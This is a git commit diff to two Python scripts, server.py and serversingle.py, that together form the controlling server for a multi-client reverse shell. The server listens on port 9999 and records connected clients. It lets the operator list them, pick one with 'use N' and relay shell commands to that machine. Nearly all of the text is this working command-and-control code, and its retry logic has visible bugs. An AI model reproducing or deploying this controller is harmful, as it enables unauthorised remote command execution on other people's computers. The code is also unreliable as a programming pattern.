5030a39b32cd47c616c148f2a3d6d66c66efd96a
Chethan <chethansputran222@gmail.com>
2021-03-06 15:34:26 +0530

    bug fixed version 1

--- server.py
+++ server.py
@@ -3,119 +3,120 @@ import sys
 import threading
 import time
 from queue import Queue
+import re
 
 No_Of_Threads = 2
-Job_No = [1, 2]
-queue = Queue()
 all_connections = []
 all_address = []
+que = Queue()
+threads = [1, 2]
 
 
-# Creating socket /Connect to computer/
 
 
+# Creating socket
 def create_socket():
     try:
-        global host
-        global port
-        global soc
-        host = ""
-
-        port = 3000
         soc = socket.socket()
+        return soc
 
     except socket.error as msg:
         print("Scoket Creation Error: "+str(msg))
 
+
+#Close connection
+def close_connection():
+    if len(all_connections)!=0:
+        for connection in all_connections:
+            connection.close()
+    print("Bye!!!")        
+    sys.exit()
+    
+
+
 # Binding the socket and listening for connection
 
-
-def bind_socket():
+def bind_socket(soc):
+   
     try:
-        global host
-        global port
-        global soc
-
+        port = 9999 
+        host =''
         print("Binding the Port "+str(port))
         soc.bind((host, port))
         # Listening
         soc.listen(5)
+    
+        
     except socket.error as msg:
         print("Scoket Binding Error: "+str(msg)+"\n"+"Retrying...")
-        create_socket()
-
-
-# (for single connection) Send command to client
-# def send_command(connection):
-#     while True:
-#         command = input()
-#         if command == 'quit':
-#             connection.close()
-#             soc.close()
-#             sys.exit()
-
-#         if len(str.encode(command)) > 0:
-#             connection.send(str.encode(command))
-#             client_response = str(connection.recv(1024), "utf-8")
-#             print(client_response, end="")
-
-
-# (For Single Client) Establish connection with a client (socket must be listening )
-# def socket_accpt():
-#     connection, add = soc.accept()
-#     print("Connection Successfull..")
-#     print("Connected to "+add[0]+"| Port "+str(add[1]))
-
-#     send_command(connection)
-#     connection.close()
-
+        bind_socket()
 
 # Display all current connection with the client
+
+
 def list_connection():
-    results = ''
+    try:    
+        results =[]
+        if len(all_connections)!=0:
+            for i, conn in enumerate(all_connections):
+                # try:
+                #     # Checking connection is still established or not
+                #     conn.send(str.encode(''))
+                #     p= conn.recv(65536)
+                #     print(p)
+                # except:
+                #     del all_connections[i]
+                #     del all_address[i]
+                #     continue
+                results.append(str(i+1)+' ' + str(all_address[i][0]) +" port : "+str(all_address[i][1]))
+            print("\t\t----Clients----"+"\n")
+        if (len(results)!=0):
+            for result in results:
+                print(result)
+            return
+        else:
+            print("No Client Found!!!\n")     
+    except :
+       close_connection()     
 
-    for i, conn in enumerate(all_connections):
-        try:
-            conn.send(str.encode(''))
-            conn.recv(20480)
-        except:
-            del all_connections[i]
-            del all_address[i]
-            continue
-
-        results = str(i)+' ' + str(all_address[i][0]) + str(all_address[i][1])
-
-    print("----Clients----"+'\n'+results)
 
 # Selecting the target
 
 
 def get_target(cmd):
     try:
-        target = cmd.replace('select ', '')  # Getting target id
-        target = int(target)
-        conn = all_connections[target]
-        print("Connected to "+str(all_address[target][0]))
-        print(str(all_address[target][0]+">", end=''))
-        return conn
+        target = re.findall(r"\d",cmd)
+        idx = int(target[0])-1
+        conn = all_connections[idx]
+        print("Connected to "+str(all_address[idx][0]))
+        print(str(all_address[idx][0])+">", end="")
+        return [conn,idx]
 
     except:
         print("Selection Invalid!!")
+        return None
 
 # Sending commands to clients
 
 
-def send_target_commands(con):
+def send_target_commands(a):
+    con = a[0]
+    idx=a[1]
     while True:
         try:
-            command = input()
-            if command == 'quit':
+            print(str(all_address[idx][0])+">", end="")
+            command = input("")
+            command = str(command).lower()
+            if ((command =="quit" )or( command == "-q")):
                 break
-            if len(str.encode(command)) > 0:
+            elif ((command == "-h") or(command == "help")):
+                helps(1)
+            elif len(str.encode(command)) > 0:
                 con.send(str.encode(command))
-                client_response = str(con.recv(20480), "utf-8")
+                client_response = str(con.recv(1024), "utf-8")
                 print(client_response, end="")
-
+            else:
+                continue
         except:
             print("Error in sending commands")
             break
@@ -123,79 +124,99 @@ def send_target_commands(con):
 
 # Handling connection from multiple clients and saving to a list
 # Closing connection when server fie restarted
-def accepting_connection():
-
-    for c in all_connections:
-        c.close()
-
+def accept_connection(soc):
+    #Close all previous connection
+    for connection in all_connections:
+        connection.close()
+    #Deleting all items from connections and adresses
     del all_connections[:]
     del all_address[:]
 
+    #Accepting the connection requrest
     while True:
         try:
-            conn, add = soc.accept()
+            conn, addr = soc.accept()
             soc.setblocking(1)  # Prevents timeout
-
             all_connections.append(conn)
-            all_address.append(add)
-
-            print('Connection has been established : '+add[0])
+            all_address.append(addr)
+            print('Connection has been established : '+addr[0])
+            
         except:
-            print("Error accepting connections")
+            time.sleep(3)
+            print("Error in accepting connection")
+            
+def helps(select):
+    if select == 0:
+        print("\n\n\t--------Help---------\n")
+        print("\n1.show (Lists available connection)\n\n2.use _id_(Selects clients from the list)\n\nExample: use 1\n\n3.help or -h\n\n")
+    elif select ==1:
+        print("\n\n\t--------Help---------\n")
+        print("\n1.q or quit\n\n2.help or -h\n\n")
+        
+
 
 
 # Interactive prompt for sending commands
-
-def start_shell():
+def start_shell(): 
+    time.sleep(3)
+    print("\n\n\t--------Help---------\n")
+    print("\n1.show (Lists available connection)\n\n2.use _id_(Selects clients from the list)\n\nExample: use 1\n\n3.quit or -q\n\n")
     while True:
-        cmd = input('shell>')
-        if cmd == 'list':
-            list_connection()
-        elif 'select' in cmd:
-            con = get_target(cmd)
-            if con is not None:
-                send_target_commands(con)
-        else:
-            print("Command not recognized!!")
+        try:
+            command = input('shell>')
+            command = command.lower()
+            if command == 'show':
+                list_connection()
+            elif 'use' in command:
+                a = get_target(command)
+                if a[0] is not None:
+                    send_target_commands(a)
+            elif ((command  =="-h" )or(command =="help")):
+                helps(0)
+            elif ((command =="-q" )or(command =="quit")):
+                close_connection()
+            else:
+                print("Command not recognized!!")
+        except Exception as e:
+            close_connection()
+           
+
 # Do next jon that is in the queue
-
-
-def work():
+def worker(): 
     while True:
-        x = queue.get()
-        if x == 1:
-            create_socket()
-            bind_socket()
-            accepting_connection()
-        if x == 2:
+        job = que.get()
+        if job == 1:
+            soc=create_socket()
+            bind_socket(soc)
+            accept_connection(soc)
+        
+        if job == 2:
             start_shell()
-        queue.task_done()
+      
+        que.task_done()
+
+def create_action():
+    for i in threads:
+        que.put(i)
+    # block until all tasks are done
+    que.join()
+    
 
 
 # Create No_Of_Threads
-
-
 def create_thread():
-    for i in range(No_Of_Threads):
-        t = threading.Thread(target=work)
-        t.daemon = True
-        t.start()
+    try:
+        for _ in range(No_Of_Threads):
+            # turn-on the worker thread
+            threading.Thread(target=worker,daemon=True).start()
+    except Exception as e:
+        close_connection()
+              
 
-
-def create_jobs():
-    for i in Job_No:
-        queue.put(i)
-    queue.join()
-
-
-create_jobs()
 create_thread()
-
-# For single client
-# def main():
-#     create_socket()
-#     bind_socket()
-#     socket_accpt()
+create_action()
 
 
-# main()
+
+
+
--- serversingle.py
+++ serversingle.py
@@ -6,38 +6,31 @@ import sys
 
 def create_socket():
     try:
-        global host
-        global port
-        global soc
-        host = ""
-
-        port = 3000
         soc = socket.socket()
-
+        return soc
     except socket.error as msg:
         print("Scoket Creation Error: "+str(msg))
+        return False
 
 # Binding the socket and listening for connection
 
 
-def bind_socket():
+def bind_socket(soc):
     try:
-        global host
-        global port
-        global soc
-
+        port =9999
+        host =""
         print("Binding the Port "+str(port))
         soc.bind((host, port))
         # Listening
         soc.listen(5)
     except socket.error as msg:
         print("Scoket Binding Error: "+str(msg)+"\n"+"Retrying...")
-        create_socket()
+        bind_socket()
 
 # Send command
 
 
-def send_command(connection):
+def send_command(connection,soc):
     while True:
         command = input()
         if command == 'quit':
@@ -52,19 +45,20 @@ def send_command(connection):
 
 
 # Establish connection with a client (socket must be listening )
-def socket_accpt():
+def socket_accpt(soc):
     connection, add = soc.accept()
     print("Connection Successfull..")
     print("Connected to "+add[0]+"| Port "+str(add[1]))
 
-    send_command(connection)
+    send_command(connection,soc)
     connection.close()
 
 
 def main():
-    create_socket()
-    bind_socket()
-    socket_accpt()
+    soc = create_socket()
+    if(soc):    
+        bind_socket(soc)
+        socket_accpt(soc)
 
 
 main()
